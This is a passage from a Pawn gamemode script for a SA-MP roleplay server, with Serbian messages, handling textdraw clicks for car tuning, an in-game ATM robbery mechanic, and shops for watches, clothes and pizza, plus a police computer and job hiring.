						}
					}
				}
				if( compid == -1 ) return SendErrorMessage( playerid, "Nema vise kompatibilnih komponenti izabrane vrste za vas model auta." );

	            RemoveVehicleComponent( vehicleid, cInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );

	            TPInfo[ playerid ][ tID ] = compid;

	            format( globalstring, sizeof( globalstring ), "%s", cInfo[ compid ][ cName ] );
				PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );

				AddVehicleComponent( vehicleid, cInfo[ compid ][ cID ] );

				SelectTextDraw( playerid, SRVBOJA1 );
			}
			else if( TPInfo[ playerid ][ tPaintjob ] == true ) {

			    new paintid = -1, vehicleid = GetPlayerVehicleID( playerid );

			    for( new i = ( TPInfo[ playerid ][ tID ]+1 ); i < NUMBER_TYPE_PAINTJOB; i++ ) {
			    	if( pjInfo[ i ][ vehID ] == GetVehicleModel( vehicleid ) ) {
						paintid = i;
						break;
					}
			   	}
			   	if( paintid == -1 ) return SendErrorMessage( playerid, "Nema vise kompatibilnih boja za vas model auta." );

                TPInfo[ playerid ][ tID ] = paintid;

                format( globalstring, sizeof( globalstring ), "%s", pjInfo[ paintid ][ pNameBre ] );
				PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );

                ChangeVehiclePaintjob( vehicleid, pjInfo[ paintid ][ pNumber ] );

                SelectTextDraw( playerid, SRVBOJA1 );
			}
			return true;
        }
        if( playertextid == TuningBuy[ playerid ][ 8 ] ) { // levo
            if( TPInfo[ playerid ][ tPaintjob ] == false ) {

	            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
		        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );

	            new compid = -1, vehicleid = GetPlayerVehicleID( playerid );

	            for( new i = (TPInfo[ playerid ][ tID ]-1); i > 0; i-- ) {
					if( cInfo[ i ][ cType ] == TPInfo[ playerid ][ tType ] ) {
						if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
							compid = i;
							break;
						}
					}
				}
				if( compid == -1 ) return SendErrorMessage( playerid, "Nema vise kompatibilnih komponenti izabrane vrste za vas model auta." );

				RemoveVehicleComponent( vehicleid, cInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );

	            TPInfo[ playerid ][ tID ] = compid;

	            format( globalstring, sizeof( globalstring ), "%s", cInfo[ compid ][ cName ] );
				PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );

				AddVehicleComponent( vehicleid, cInfo[ compid ][ cID ] );

				SelectTextDraw( playerid, SRVBOJA1 );
			}
			else if( TPInfo[ playerid ][ tPaintjob ] == true ) {

			    new paintid = -1, vehicleid = GetPlayerVehicleID( playerid );

			    for( new i = (TPInfo[ playerid ][ tID ]-1); i > 0; i-- ) {
			    	if( pjInfo[ i ][ vehID ] == GetVehicleModel( vehicleid ) ) {
						paintid = i;
						break;
					}
			   	}
			   	if( paintid == -1 ) return SendErrorMessage( playerid, "Nema vise kompatibilnih boja za vas model auta." );

                TPInfo[ playerid ][ tID ] = paintid;

                format( globalstring, sizeof( globalstring ), "%s", pjInfo[ paintid ][ pNameBre ] );
				PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );

                ChangeVehiclePaintjob( vehicleid, pjInfo[ paintid ][ pNumber ] );

                SelectTextDraw( playerid, SRVBOJA1 );
			}
			return true;
        }
        if( playertextid == TuningBuy[ playerid ][ 9 ] ) { // buy
            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
	        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );

            new Float:Pos[ 6 ], vehicleid = GetPlayerVehicleID( playerid );

            if( TPInfo[ playerid ][ tPaintjob ] == false ) {

				new cid = TPInfo[ playerid ][ tID ];

		        RemoveVehicleComponent( vehicleid, cInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );

		        VehicleInfo[ vehicleid ][ vTuned ] = true;

		        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

			}
			else if( TPInfo[ playerid ][ tPaintjob ] == true ) {

			    new paintid = TPInfo[ playerid ][ tID ];

			    VehicleInfo[ vehicleid ][ vTuned ] = true;

			    VehicleInfo[ vehicleid ][ vPaintJob ] = pjInfo[ paintid ][ pNumber ];

			    ChangeVehicleColor( vehicleid, TPInfo[ playerid ][ PJColor ][ 0 ], TPInfo[ playerid ][ PJColor ][ 1 ] );

			    ChangeVehiclePaintjob( vehicleid, pjInfo[ paintid ][ pNumber ] );

			}
			GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, 6, 2 );
			SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

			GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
			SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

			CancelSelectTextDraw( playerid );

		    TuningTDShow( playerid, false );
		    TogglePlayerControllable( playerid, true );

			SPD( playerid, dialog_TUNING, DSL, D_NASLOV, "Paintjobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nWheels\nCar Stereo\nHydraulics\nNitro", D_ODABERI, D_ODUSTANI );
            return true;
		}
        if( playertextid == TuningBuy[ playerid ][ 13 ] ) { // close

            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
	        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );

            new Float:Pos[ 6 ], vehicleid = GetPlayerVehicleID( playerid );

			if( TPInfo[ playerid ][ tPaintjob ] == false ) {

		        RemoveVehicleComponent( vehicleid, cInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );
			}
			else if( TPInfo[ playerid ][ tPaintjob ] == true ) {
			    ChangeVehiclePaintjob( vehicleid, 3 );
				ChangeVehicleColor( vehicleid, TPInfo[ playerid ][ PJColor ][ 0 ], TPInfo[ playerid ][ PJColor ][ 1 ] );
			}
			
			GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, 6, 2 );
			SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

			GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
			SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

	        CancelSelectTextDraw( playerid );

			TuningTDShow( playerid, false );
		    TogglePlayerControllable( playerid, true );

			SPD( playerid, dialog_TUNING, DSL, D_NASLOV, "Paintjobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nWheels\nCar Stereo\nHydraulics\nNitro", D_ODABERI, D_ODUSTANI );
            return true;
		}
		//
		if( playertextid == atmTD[ playerid ][ 1 ] ) { // presecanje zica
		    new atmid = GetNearestAtm( playerid );
		    if( atmid == -1 ) return SendErrorMessage( playerid, "Nisi pored bankomata." );
		    if( atmInfo[ atmid ][ atmPreseceneZice ] == true ) return SendErrorMessage( playerid, "Vec su presecene zice." );
            if( atmInfo[ atmid ][ atmVremeDoRoba ] != 0 ) return SendErrorMessage( playerid, "Ovaj bankomat je vec opljackan." );
            if( GetWeapon( playerid ) != 4 ) return SendErrorMessage( playerid, "Morate da imate noz u rukama" );

            atmrobTimer[ playerid ] = SetTimerEx( "RobZiceAtm", 1000, true, "d", playerid );
            robbingATM[ playerid ] = atmid;
            robbingATMSeconds[ playerid ] = 95;

            CancelSelectTextDraw( playerid );
            SendInfoMessage( playerid, "Poceli ste sa obijanjem bankomata, ne pomerajte se sa svog mesta." );
			return true;
		}
		if( playertextid == atmTD[ playerid ][ 2 ] ) { // ulazak u bios
		    new atmid = GetNearestAtm( playerid );
		    if( !LaptopRuke[ playerid ] ) return SendErrorMessage( playerid, "Nemate laptop u rukama." );
		    if( atmid == -1 ) return SendErrorMessage( playerid, "Nisi pored bankomata." );
		    if( atmInfo[ atmid ][ atmProbijenBios ] == true ) return SendErrorMessage( playerid, "Vec je hakovan ovaj bankomat." );
			if( atmInfo[ atmid ][ atmVremeDoRoba ] != 0 ) return SendErrorMessage( playerid, "Ovaj bankomat je vec opljackan." );
			
			playeratmBar[ playerid ] = CreatePlayerProgressBar( playerid, 191.00, 197.00, 259.50, 5.19, SRVBOJA1, 100.0, BAR_DIRECTION_RIGHT);
            SetPlayerProgressBarValue( playerid, playeratmBar[ playerid ], 0.0 );
            ShowPlayerProgressBar( playerid, playeratmBar[ playerid ] );
            
			robbingATM[ playerid ] = atmid;
            atmLoadingTDControl( playerid, true );
            
            PlayerTextDrawSetString( playerid, atmrobLoading[ playerid ][ 1 ], "0%" );
            
            atmrobTimer[ playerid ] = SetTimerEx( "ProgresAtmBar", 1000, false, "d", playerid );
            
            CancelSelectTextDraw( playerid );
			return true;
		}
		if( playertextid == atmTD[ playerid ][ 3 ] ) { // kradja novca
		    new atmid = GetNearestAtm( playerid );
		    if( atmid == -1 ) return SendErrorMessage( playerid, "Nisi pored bankomata." );
		    if( atmInfo[ atmid ][ atmVremeDoRoba ] != 0 ) return SendErrorMessage( playerid, "Ovaj bankomat je vec opljackan." );
			if( atmInfo[ atmid ][ atmPreseceneZice ] == true ) {
			    new pokusaj = random(4);
			    if( pokusaj == 1 ) {
			        Novi_KillTimer( atmrobTimer[ playerid ] );
			        
			        SendInfoMessage( playerid, "Niste uspeli ukrasti novac, alarm se oglasio." );
                    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 3 );

				    atmInfo[ atmid ][ atmVremeDoRoba ] = 60;
		    		SacuvajATM( atmid );
		    		PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

		    		atmTDControl( playerid, false );
			    }
			    else {
			        Novi_KillTimer( atmrobTimer[ playerid ] );
			        
				    new money = ( random(5000)+10000 );
				    DajIgracuNovac( playerid, money );
				    SavePlayer( playerid ); UpdateBankTD( playerid );
				    SendInfoMessage( playerid, "Uspesno ste ukrali iz bankomata %d$.", money );
                    PostaviWanted( playerid, "Pljacka bankomata", "Nepoznati", 3 );

				    atmInfo[ atmid ][ atmVremeDoRoba ] = 120;
		    		SacuvajATM( atmid );
		    		PlayerInfo[ playerid ][ xPljackaVreme ] = 120;

		    		atmTDControl( playerid, false );
	    		}
			}
			else if( atmInfo[ atmid ][ atmProbijenBios ] == true ) {
				new pokusaj = random(4);
			    if( pokusaj == 1 ) {
			        Novi_KillTimer( atmrobTimer[ playerid ] );
			        
			        SendInfoMessage( playerid, "Niste uspeli prebaciti novac na vas racun, sistem zastite bankomata je ponovno podignut." );
                    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 3 );
                    
				    atmInfo[ atmid ][ atmVremeDoRoba ] = 60;
		    		SacuvajATM( atmid );
		    		PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

		    		atmTDControl( playerid, false );
			    }
			    else {
			        Novi_KillTimer( atmrobTimer[ playerid ] );
			        
				    new money = ( random(5000)+10000 );
				    PlayerInfo[ playerid ][ xBRacun ] += money;
				    SavePlayer( playerid ); UpdateBankTD( playerid );
				    SendInfoMessage( playerid, "Uspesno ste sa bankomata prebacili %d$ na vas racun.", money );
                    PostaviWanted( playerid, "Pljacka bankomata", "Nepoznati", 3 );

				    atmInfo[ atmid ][ atmVremeDoRoba ] = 120;
		    		SacuvajATM( atmid );
		    		PlayerInfo[ playerid ][ xPljackaVreme ] = 120;

		    		atmTDControl( playerid, false );
	    		}
			}
			else return SendErrorMessage( playerid, "Moras prvo da hakujes bankomat ili da mu preseces zice." );
			return true;
		}
		//
		if( playertextid == buyWatch[ playerid ][ 3 ] ) {
		    new text[ 30 ];
		    if( WatchModel[ playerid ] == 19039 ) {
				if( PlayerInfo[ playerid ][ xNovac ] < 521 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -521 );
				text = "Rolex Datejust za 521$";
				PlayerInfo[ playerid ][ xSat ] = 19039;
			}
		    else if( WatchModel[ playerid ] == 19040 ) {
				if( PlayerInfo[ playerid ][ xNovac ] < 618 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -618 );
				text = "Emporio Armani za 618$";
				PlayerInfo[ playerid ][ xSat ] = 19040;
			}
		    else if( WatchModel[ playerid ] == 19041 ) {
				if( PlayerInfo[ playerid ][ xNovac ] < 723 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -723 );
				text = "Casio G-Shock za 723$";
				PlayerInfo[ playerid ][ xSat ] = 19041;
			}
		    else if( WatchModel[ playerid ] == 19042 ) {
				if( PlayerInfo[ playerid ][ xNovac ] < 819 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -819 );
				text = "Michael Kors za 819$";
				PlayerInfo[ playerid ][ xSat ] = 19042;
			}
		    else if( WatchModel[ playerid ] == 19043 ) {
				if( PlayerInfo[ playerid ][ xNovac ] < 916 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
				DajIgracuNovac( playerid, -916 );
				text = "Hugo Boss za 916$";
				PlayerInfo[ playerid ][ xSat ] = 19043;
		    }
		    
		    SendInfoMessage( playerid, "Uspesno si kupio sat marke %s.( koristi komandu /time ).", text );
		    
		    SavePlayer( playerid );
		    
		    buyWatchTDControl( playerid, false );
			return true;
		}
		if( playertextid == buyWatch[ playerid ][ 7 ] ) {
		    SendInfoMessage( playerid, "Odustali ste od kupovine sata." );
		    buyWatchTDControl( playerid, false );
		    return true;
		}
		if( playertextid == buyWatch[ playerid ][ 4 ] ) {
		    new text[ 30 ];
		    if( WatchModel[ playerid ] == 19043 ) return 1;
		    WatchModel[ playerid ]++;
		    PlayerTextDrawSetPreviewModel( playerid, buyWatch[ playerid ][ 1 ], WatchModel[ playerid ] );
		    PlayerTextDrawShow( playerid, buyWatch[ playerid ][ 1 ] );
		    if( WatchModel[ playerid ] == 19039 ) text = "Rolex Datejust - 521$";
		    else if( WatchModel[ playerid ] == 19040 ) text = "Emporio Armani - 618$";
		    else if( WatchModel[ playerid ] == 19041 ) text = "Casio G-Shock - 723$";
		    else if( WatchModel[ playerid ] == 19042 ) text = "Michael Kors - 819$";
		    else if( WatchModel[ playerid ] == 19043 ) text = "Hugo Boss - 916$";
		    PlayerTextDrawSetString( playerid, buyWatch[ playerid ][ 2 ], text );
			return true;
		}
		if( playertextid == buyWatch[ playerid ][ 5 ] ) {
		    new text[ 30 ];
		    if( WatchModel[ playerid ] == 19039 ) return 1;
		    WatchModel[ playerid ]--;
		    PlayerTextDrawSetPreviewModel( playerid, buyWatch[ playerid ][ 1 ], WatchModel[ playerid ] );
		    PlayerTextDrawShow( playerid, buyWatch[ playerid ][ 1 ] );
		    if( WatchModel[ playerid ] == 19039 ) text = "Rolex Datejust - 521$";
		    else if( WatchModel[ playerid ] == 19040 ) text = "Emporio Armani - 618$";
		    else if( WatchModel[ playerid ] == 19041 ) text = "Casio G-Shock - 723$";
		    else if( WatchModel[ playerid ] == 19042 ) text = "Michael Kors - 819$";
		    else if( WatchModel[ playerid ] == 19043 ) text = "Hugo Boss - 916$";
		    PlayerTextDrawSetString( playerid, buyWatch[ playerid ][ 2 ], text );
			return true;
		}
		// 
 	    if( playertextid == Ormar[ playerid ][ 8 ] ) {
 	        if( II[ inProperty[ playerid ] ][ iSkin ][ 0 ] == GetPlayerSkin( playerid ) ) { II[ inProperty[ playerid ] ][ iSkin ][ 0 ] = 0; }
 	        if( II[ inProperty[ playerid ] ][ iSkin ][ 1 ] == GetPlayerSkin( playerid ) ) { II[ inProperty[ playerid ] ][ iSkin ][ 1 ] = 0; }
 	        if( II[ inProperty[ playerid ] ][ iSkin ][ 2 ] == GetPlayerSkin( playerid ) ) { II[ inProperty[ playerid ] ][ iSkin ][ 2 ] = 0; }

			SaveProperty( inProperty[ playerid ] );
			PlayerInfo[ playerid ][ xSkin ] = GetPlayerSkin( playerid );
			SCM( playerid, SRVBOJA1, "Obukli ste drugu odecu. " );
			Novi_SetPlayerPos( playerid, II[ inProperty[ playerid ] ][ iExit ][ 0 ], II[ inProperty[ playerid ] ][ iExit ][ 1 ], II[ inProperty[ playerid ] ][ iExit ][ 2 ] );
			SetPlayerInterior( playerid, II[ inProperty[ playerid ] ][ iInterior ] );
			SetPlayerVirtualWorld( playerid, II[ inProperty[ playerid ] ][ iVW ] );
			ClearAnimations( playerid );
			GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
		  	SetCameraBehindPlayer( playerid );
		    TogglePlayerControllable( playerid, false );
			CancelSelectTextDraw( playerid );
			OrmarTDControl( playerid, false );
			TogglePlayerControllable( playerid, true );
			return true;
		}
 	    if( playertextid == Ormar[ playerid ][ 3 ] ) {
 	        if( II[ inProperty[ playerid ] ][ iSkin ][ 0 ] == 0 ) return SendErrorMessage( playerid, " U ovom slotu nemate odecu." );
 	        PostaviSkin( playerid, II[ inProperty[ playerid ] ][ iSkin ][ 0 ] ); ApplyAnimation( playerid, "CLOTHES","CLO_Pose_Legs",4.1,1,0,0,0,0, 1);
 	        return true;
 	    }
 	    if( playertextid == Ormar[ playerid ][ 4 ] ) {
 	        if( II[ inProperty[ playerid ] ][ iSkin ][ 1 ] == 0 ) return SendErrorMessage( playerid, " U ovom slotu nemate odecu." );
 	        PostaviSkin( playerid, II[ inProperty[ playerid ] ][ iSkin ][ 1 ] ); ApplyAnimation( playerid, "CLOTHES","CLO_Pose_Legs",4.1,1,0,0,0,0, 1);
 	        return true;
 	    }
 	    if( playertextid == Ormar[ playerid ][ 5 ] ) {
 	        if( II[ inProperty[ playerid ] ][ iSkin ][ 2 ] == 0 ) return SendErrorMessage( playerid, " U ovom slotu nemate odecu." );
 	        PostaviSkin( playerid, II[ inProperty[ playerid ] ][ iSkin ][ 2 ] ); ApplyAnimation( playerid, "CLOTHES","CLO_Pose_Legs",4.1,1,0,0,0,0, 1);
   			
 	        return true;
 	    }
 	    if( playertextid == Ormar[ playerid ][ 9 ] ) {
 	        Novi_SetPlayerPos( playerid, II[ inProperty[ playerid ] ][ iExit ][ 0 ], II[ inProperty[ playerid ] ][ iExit ][ 1 ], II[ inProperty[ playerid ] ][ iExit ][ 2 ] );
			SetPlayerInterior( playerid, II[ inProperty[ playerid ] ][ iInterior ] );
			SetPlayerVirtualWorld( playerid, II[ inProperty[ playerid ] ][ iVW ] );
			SCM( playerid, SRVBOJA1, "Odustali ste od oblacenja nove odece. " );
			PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
			
			ClearAnimations( playerid );
			GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
		   	SetCameraBehindPlayer( playerid );
		    TogglePlayerControllable( playerid, false );
			CancelSelectTextDraw( playerid );
			OrmarTDControl( playerid, false );
			TogglePlayerControllable( playerid, true );
			return true;
 	    }
 	    if( playertextid == Police_TV[ playerid ][ 7 ] ) {
 	        SPD( playerid, dialog_SEARCH_NAME, DSI, D_NASLOV, "Upisite Ime i prezime gradjanina(Ime_Prezime) kojega zelite potraziti u bazi podataka:", D_ODABERI, D_ODUSTANI );
 	        return true;
 	    }
 	    if( playertextid == Police_TV[ playerid ][ 8 ] ) {
			SPD( playerid, dialog_SEARCH_NUMBERPLATE, DSI, D_NASLOV, "Unesite broj tablice u prazno polje.(bez nula-00 i bez LS( samo broj ) )", D_ODABERI, D_ODUSTANI );
 	        return true;
 	    }
 	    if( playertextid == Police_TV[ playerid ][ 9 ] ) {
 	        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
 	        strcat( DialogStrgEx, "|_______-=Popis svih zatvorenika=-________|\n" );
            foreach( Player, i ) {
				if( IsPlayerConnected( i ) ) {
	  				if( PlayerInfo[ i ][ xZatvor ] == OBICAN_ZATVOR ) {
						format( globalstring, sizeof( globalstring ), "%s\n", ImeIgraca( i ) );
						strcat( DialogStrgEx, globalstring );
					}
				}
			}
			ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
        	return true;
 	    }
 	    if( playertextid == Police_TV[ playerid ][ 10 ] ) {
 	        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
 	        strcat( DialogStrgEx, "|_______-=Popis svih osumnjicenih=-________|\n" );
            foreach( Player, i )
			{
				if( IsPlayerConnected( i ) )
				{
	  				if( PlayerInfo[ i ][ xWanted ] > 0 )
			    	{
						format( globalstring, sizeof( globalstring ), "- %s | Wanted Level: %d\n", ImeIgraca( i ), PlayerInfo[ i ][ xWanted ] );
						strcat( DialogStrgEx, globalstring );
					}
				}
			}
			ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
        	return true;
 	    }
 	    if( playertextid == Police_TV[ playerid ][ 11 ] ) {
 	    	if(GetPVarInt( playerid, "RequestingBackup") != 1) {
				format( globalstring, sizeof( globalstring ), "SVE JEDINICE: %s trazi pojacanje i oznacen je na GPSu (crveno).", ImeIgraca( playerid ) );
				SetPVarInt( playerid, "RequestingBackup", 1);

				foreach( Player, i ) {
					if( IsPlayerConnected(i)) {
						if( OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_PD ) {
							SetPlayerMarkerForPlayer( i, playerid, 0xFF0000FF );
							SCM( i, 0x8D8DFF00, globalstring );
						}
					}
				}
				SCM( playerid, 0x8D8DFF00, "Ukucajte /bkc da bi ste izbrisali pojacanje." );
				backuptimer[ playerid ] = SetTimerEx( "BackupClear", 180000, false, "ii", playerid, 1 );
			} else SendErrorMessage( playerid, "Vec imate aktivan zahtev za pojacanje!");
			return true;
		}
 	    if( playertextid == Police_TV[ playerid ][ 12 ] ) {
 	        SPD( playerid, dialog_OCISTIDOSIJE, DSI, D_NASLOV, "Upisite Ime i prezime gradjanina(Ime_Prezime).", D_ODABERI, D_ODUSTANI );
 	        return true;
		}
 	    if( playertextid == Police_TV[ playerid ][ 13 ] ) {
 	        SPD( playerid, dialog_POSTAVIPOTERU, DSI, D_NASLOV, "Upisite Ime i prezime gradjanina(Ime_Prezime) i razlog optuzbe.", D_ODABERI, D_ODUSTANI );
 	        return true;
 	    }
 	    //
 	    if( playertextid == PizzaMenu[ playerid ][ 7 ] ) {
 	    
 	        if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0 ) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
			if( PlayerInfo[ playerid ][ xNovac ] < 67 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 67$!");
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			BussinesMoney( uFirmi[ playerid ] , 65 );
			DajIgracuNovac( playerid, -67 );
			DodajIgracuHP( playerid, 30 );
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			format( globalstring, sizeof( globalstring ), "* %s uzima kupljene stvari od prodavacice i jede.", ImeIgraca( playerid ) );
	    	PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
		    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
		    PizzaMenuTDControl( playerid, false );
 	    	return true;
 	    }
 	    if( playertextid == PizzaMenu[ playerid ][ 10 ] ) {

 	        if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
			if( PlayerInfo[ playerid ][ xNovac ] < 79) return SendErrorMessage( playerid, "Nemate dovoljno novca 79$!");
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			BussinesMoney( uFirmi[ playerid ] , 65);
			DajIgracuNovac( playerid, -79 );
			DodajIgracuHP( playerid, 30 );
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			format( globalstring, sizeof( globalstring ), "* %s uzima kupljene stvari od prodavacice i jede.", ImeIgraca( playerid ) );
	    	PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
		    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
		    PizzaMenuTDControl( playerid, false );
 	    	return true;
 	    }
 	    if( playertextid == PizzaMenu[ playerid ][ 13 ] ) {

 	        if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
			if( PlayerInfo[ playerid ][ xNovac ] < 81) return SendErrorMessage( playerid, "Nemate dovoljno novca 81$!");
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			BussinesMoney( uFirmi[ playerid ] , 65);
			DajIgracuNovac( playerid, -81 );
			DodajIgracuHP( playerid, 30 );
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			format( globalstring, sizeof( globalstring ), "* %s uzima kupljene stvari od prodavacice i jede.", ImeIgraca( playerid ) );
	    	PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
		    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
		    PizzaMenuTDControl( playerid, false );
 	    	return true;
 	    }
 	    if( playertextid == PizzaMenu[ playerid ][ 16 ] ) {

 	        if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
			if( PlayerInfo[ playerid ][ xNovac ] < 89) return SendErrorMessage( playerid, "Nemate dovoljno novca 89$!");
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			BussinesMoney( uFirmi[ playerid ] , 65);
			DajIgracuNovac( playerid, -89 );
			DodajIgracuHP( playerid, 30 );
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			format( globalstring, sizeof( globalstring ), "* %s uzima kupljene stvari od prodavacice i jede.", ImeIgraca( playerid ) );
	    	PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
		    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
		    PizzaMenuTDControl( playerid, false );
 	    	return true;
 	    }
 	    if( playertextid == PizzaMenu[ playerid ][ 19 ] ) {

 	        if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
			if( PlayerInfo[ playerid ][ xNovac ] < 98) return SendErrorMessage( playerid, "Nemate dovoljno novca 98$!");
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			BussinesMoney( uFirmi[ playerid ] , 70);
			DajIgracuNovac( playerid, -98 );
			DodajIgracuHP( playerid, 30 );
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			format( globalstring, sizeof( globalstring ), "* %s uzima kupljene stvari od prodavacice i jede.", ImeIgraca( playerid ) );
	    	PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
		    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
		    PizzaMenuTDControl( playerid, false );
 	    	return true;
 	    }
 	    if( playertextid == PizzaMenu[ playerid ][ 22 ] ) {

 	        if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
			if( PlayerInfo[ playerid ][ xNovac ] < 108) return SendErrorMessage( playerid, "Nemate dovoljno novca 108$!");
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			BussinesMoney( uFirmi[ playerid ] , 70);
			DajIgracuNovac( playerid, -108 );
			DodajIgracuHP( playerid, 30 );
			BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
			format( globalstring, sizeof( globalstring ), "* %s uzima kupljene stvari od prodavacice i jede.", ImeIgraca( playerid ) );
	    	PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
		    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
		    PizzaMenuTDControl( playerid, false );
 	    	return true;
 	    }
 	    
 	    //
 	    if( playertextid == ZaposljavanjeTD[ playerid ][ 7 ] ) {
 	    
 	        if( PlayerInfo[ playerid ][ xPosao ] != 0 ) {
 	            SendErrorMessage( playerid, "Vec imate posao!Koristite /otkaz da date otkaz!");
            	ZaposljavanjeTDControl( playerid, false, "", "", "" );
            	CancelSelectTextDraw( playerid );
 	            return true;
			}
			
    		if( GetPlayerState( playerid ) != 1 ) {
				SendErrorMessage( playerid, "Ne smete biti u vozilu!");
            	ZaposljavanjeTDControl( playerid, false, "", "", "" );
            	CancelSelectTextDraw( playerid );
 	            return true;
			}

			if( PlayerInfo[ playerid ][ xLicnaKarta ] == 0 && PlayerInfo[playerid][xPasos] == 0)
			{
				SendErrorMessage( playerid, "Nemate licnu kartu i pasos.Izvadite ih u birou za zaposljavanje!");
            	ZaposljavanjeTDControl( playerid, false, "", "", "" );
            	CancelSelectTextDraw( playerid );
 	            return true;
			}
			
			else if( ChosenJob[ playerid ] == POSAO_KOSAC ) {
	 	        ShowPlayerDialog( playerid, 0, DSMSG, "Posao Kosac trave",
					""col_job"Cestitamo! Uspesno ste se zaposlili kao Kosac trave!\n\n" \
